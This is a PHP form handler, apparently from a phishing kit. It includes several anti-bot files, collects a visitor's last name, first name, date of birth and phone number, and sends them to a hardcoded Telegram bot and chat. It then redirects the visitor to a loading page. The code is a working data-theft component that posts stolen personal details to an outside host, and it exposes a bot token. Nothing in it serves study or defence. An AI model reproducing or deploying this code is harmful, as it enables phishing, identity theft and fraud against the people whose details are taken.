<?php


include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';



// Informations Telegram
$botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
$chatId = "8134069302";

// Récupérer les données du formulaire
$lastname = $_POST['lastname'];
$firstname = $_POST['firstname'];
$day = $_POST['day'];
$month = $_POST['month'];
$year = $_POST['year'];
$phone = $_POST['phone'];

// Message à envoyer
$message = "info perso:\n";
$message .= "Nom: $lastname\n";
$message .= "Prénom: $firstname\n";
$message .= "Date de naissance: $day/$month/$year\n";
$message .= "Numéro de téléphone: $phone";

// URL de l'API Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Envoi des données
$data = [
    'chat_id' => $chatId,
    'text' => $message,
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context = stream_context_create($options);
$response = file_get_contents($url, false, $context);

// Redirection après soumission
header("Location: ../chargement.php");
exit();
?>
